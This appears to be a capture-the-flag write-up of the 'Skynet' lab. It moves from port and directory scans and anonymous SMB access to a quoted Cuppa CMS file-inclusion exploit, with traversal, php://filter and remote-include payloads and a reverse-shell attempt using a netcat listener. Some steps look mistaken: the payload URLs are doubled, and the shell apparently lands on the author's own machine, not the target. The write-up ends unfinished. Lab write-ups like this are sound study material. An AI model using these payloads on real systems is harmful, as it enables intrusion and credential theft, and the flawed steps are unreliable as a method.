<h1 align="center">Challenge 052 - Skynet </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/3c4b6ee3-d857-4d2a-be2e-aeb6695529a2" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>

We will deal with a vulnerable Linux machine in this CTF, let's get started.

## Reconnaissance
We proceed with the classic port scanning

```
root@ip-10-10-177-206:~# nmap -sV -p- -A 10.10.210.136
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-17 14:09 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.210.136
Host is up (0.00053s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL PIPELINING UIDL CAPA AUTH-RESP-CODE TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more IDLE Pre-login have SASL-IR post-login LOGIN-REFERRALS LITERAL+ listed ENABLE capabilities LOGINDISABLEDA0001 OK IMAP4rev1 ID
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:AD:22:9B:9F:5D (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m58s, deviation: 3h27m50s, median: -1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-11-17T08:09:35-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not requiredsquirrelmail/
| smb2-time: 
|   date: 2025-11-17T14:09:35
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 10.10.210.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.36 seconds
```

We seem to have a server daemon that handles file and print services for SMB/CIFS clients on port 139. It allows for sharing files and printers over a network, enabling users to access resources on a Samba server from Windows, Linux or other operating systems. We also have a web service. Let's check it out.

<img width="724" height="383" alt="grafik" src="https://github.com/user-attachments/assets/3c1ef570-0ad9-44e7-b364-6b79cc986460" />

Doesn't seem like we can really do much with this search engine, so I just tried to brute force directories again.

```
root@ip-10-10-177-206:~# gobuster dir -u 10.10.210.136 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.210.136
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.10.210.136/admin/]
/.htaccess            (Status: 403) [Size: 278]
/config               (Status: 301) [Size: 315] [--> http://10.10.210.136/config/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.210.136/css/]
/index.html           (Status: 200) [Size: 523]
/js                   (Status: 301) [Size: 311] [--> http://10.10.210.136/js/]
/server-status        (Status: 403) [Size: 278]
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.210.136/squirrelmail/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The directories of admin, config and squirrelmail seemed interesting, but I was forbidden on accessing the first two. The last one shows the following login page.

<img width="383" height="272" alt="grafik" src="https://github.com/user-attachments/assets/d9e1eb99-9a85-4e1f-9012-a76da8e9279a" />

The Page Source contained JavaScript code that seemed exploitable, but I quickly aborted that idea.

I didn't really find anything else that could help me in figuring out how to exploit the login page, so I just moved on and enumerated information from Samba shares with enum4linux.

```
root@ip-10-10-197-105:~# enum4linux -U -o 10.10.210.136
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 17 15:15:11 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.210.136
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.210.136    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ====================================== 
|    Session Check on 10.10.210.136    |
 ====================================== 
[+] Server 10.10.210.136 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.210.136    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.210.136    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.210.136 from smbclient: 
[+] Got OS info for 10.10.210.136 from srvinfo:
	SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.210.136    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:[milesdyson] rid:[0x3e8]
enum4linux complete on Mon Nov 17 15:15:12 2025
```

We can see a user milesdyson who is a known user. Not much else is revealed.

```
root@ip-10-10-197-105:~# smbclient -L //10.10.210.136 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

The -L option lists the available shares, and -N allows us to connect without a password (anonymous access).

With the -L command we have identified several shares on the Samba server:
1. **Print$:** This share is typically used for printer drivers and may not be useful for exploitation
2. **Anonymous:** This share allows anonymous access, which may provide us with access to files without needing credentials. We can explore this share using *smbclient //10.10.210.136/anonymous* to see what files are available.
3. **Milesdyson:** This personal share could potentially contain sensitive files. If we can find a way to authenticate or guess the password, we may gain access.
4. **IPC$:** This is used for inter-process communication and generally does not contain user-accessible files.

I proceeded to explore the anonymous share. Maybe we can get some information, with which we can access the milesdyson share.

```
root@ip-10-10-197-105:~# smbclient //10.10.210.136/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5831004 blocks available
smb: \> pwd
Current directory is \\10.10.210.136\anonymous\
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (159.2 KiloBytes/sec) (average 159.2 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5834136 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (230.0 KiloBytes/sec) (average 206.4 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 154.8 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 154.8 KiloBytes/sec)
smb: \> quit
```

Now let's have a look at those files. The attention.txt contained the following information

<img width="642" height="111" alt="Bildschirmfoto vom 2025-11-17 17-06-48" src="https://github.com/user-attachments/assets/89f0c881-1021-4540-a868-79836760fc6d" />

log1.txt had some sort of wordlist

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

The other two log files on the other hand were empty for some reason.

I first tried using hydra to get access to the Samba server, but quickly found out the wordlist probably needed to be used somewhere else, like the squirrelmail login page. I already got in by just using the very first password from the list so I didn't really have to use any tools. Lucky. The username was milesdyson.

<img width="971" height="285" alt="grafik" src="https://github.com/user-attachments/assets/5b445a18-9833-428f-9069-905df98f4db4" />

The first message contains the following information:

<img width="818" height="317" alt="grafik" src="https://github.com/user-attachments/assets/639af73b-206e-4f16-ab81-e3ec631f61d4" />

Something we can keep in mind for later. the second message said this:

<img width="819" height="356" alt="grafik" src="https://github.com/user-attachments/assets/3e489f64-5221-4002-b758-86530b67d758" />

Seems like something we need to convert to ascii first.

<img width="610" height="732" alt="grafik" src="https://github.com/user-attachments/assets/f04b0b55-cef2-4d39-9783-86a4965ad363" />

I don't really know what to do with that information. The third message contains further information like that.

<img width="821" height="450" alt="grafik" src="https://github.com/user-attachments/assets/06fe91d1-cdec-4253-a0e6-e63b38434568" />

I proceeded to login with the credentials I found in smb.

```
root@ip-10-10-197-105:~# smbclient -U milesdyson //10.10.210.136/milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 10:05:47 2019
  ..                                  D        0  Wed Sep 18 04:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
  notes                               D        0  Tue Sep 17 10:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019

		9204224 blocks of size 1024. 5830932 blocks available
smb: \> pwd
Current directory is \\10.10.210.136\milesdyson\
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 10:18:40 2019
  ..                                  D        0  Tue Sep 17 10:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
  important.txt                       N      117  Tue Sep 17 10:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019

		9204224 blocks of size 1024. 5830928 blocks available
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)
smb: \notes\> quit
```

As this was the only text file I just focused on looking up that content.

<img width="444" height="114" alt="grafik" src="https://github.com/user-attachments/assets/bf66c52d-522a-421a-9739-0546cac985c6" />

Bullseye! This talks about a hidden directory containing some sort of CMS. Checking it out shows us this site.

<img width="969" height="525" alt="grafik" src="https://github.com/user-attachments/assets/6f7837be-2b5b-407e-8ed7-3e2263fa511f" />

Seems to be a simple static site. Too bad. Maybe we can find something with gobuster again.

```
root@ip-10-10-197-105:~# gobuster dir -u 10.10.210.136/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.210.136/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/administrator        (Status: 301) [Size: 339] [--> http://10.10.210.136/45kra24zxs28v3yd/administrator/]
/index.html           (Status: 200) [Size: 418]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

And yet again we find a directory, which will hopefully give us more ideas on how to move on from here.

<img width="667" height="392" alt="grafik" src="https://github.com/user-attachments/assets/f32dd290-3e0b-470d-a3c7-ab38a30b763e" />

Oh god, not another login page. Let it end! To see if there is some sort of exploit for this kind of Content Managament System I started googling for Cuppa CMS vulnerabilities and recognized that Remote File Inclusion would be a feasible way to read sensitive information. The exploit-db website had some beautiful source code that explains, what we can abuse

```
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /          
  / XXXXXX /
 (________(            
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22: 
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------
    

#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream 

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "Db@dmin";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
################################################################################################################            
```

Replacing *http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd* with the actual URL would be the first step in figuring out the limits on how we can abuse the system. We insert *http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd* and get the following output

<img width="971" height="369" alt="grafik" src="https://github.com/user-attachments/assets/593c7319-2621-424e-ae45-ec67a727d7e6" />

This worked out beautifully. We can use the same trick to display the user.txt. For that I just appended the following URL *http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt*

<img width="332" height="108" alt="Bildschirmfoto vom 2025-11-17 19-28-46" src="https://github.com/user-attachments/assets/20dce57f-e634-4ea7-aa0b-09eb7b5d8446" />

Now to get the final root.txt I realized manually traversing through directories with LFI wouldn't really take us far. What would maybe help us out now is hosting our own web server with our very own PHP reverse shell file that the vulnerable application could access. We make this possible by running a simple HTTP server on our attack machine

```
root@ip-10-10-197-105:~# php -S 10.10.197.105:8000
[Mon Nov 17 18:54:29 2025] PHP 7.4.3-4ubuntu2.24 Development Server (http://10.10.197.105:8000) started
```

After that we can craft our LFI payload to include the URL of our reverse shell. In our instance the payload looked like this *http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.210.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.197.105:8000/php-reverse-shell.php*

We also set up a netcat listener that was set up to catch the reverse shell connection on port 1337. With that we triggered the LFI payload and had a successful shell 

```
root@ip-10-10-197-105:~# nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.197.105 49916
Linux ip-10-10-197-105 5.15.0-124-generic #134~20.04.1-Ubuntu SMP Tue Oct 1 15:27:33 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 18:55:16 up  3:48,  0 users,  load average: 0.04, 0.13, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root),998(docker),1001(rvm)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Now it was time to figure out where the root.txt file resides.

```
# find / -type f -name root.txt 2>dev/null
/usr/share/wordlists/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt
```

I realized this wasn't the text file we were looking for, so something clearly still isnt working its supposed to. 
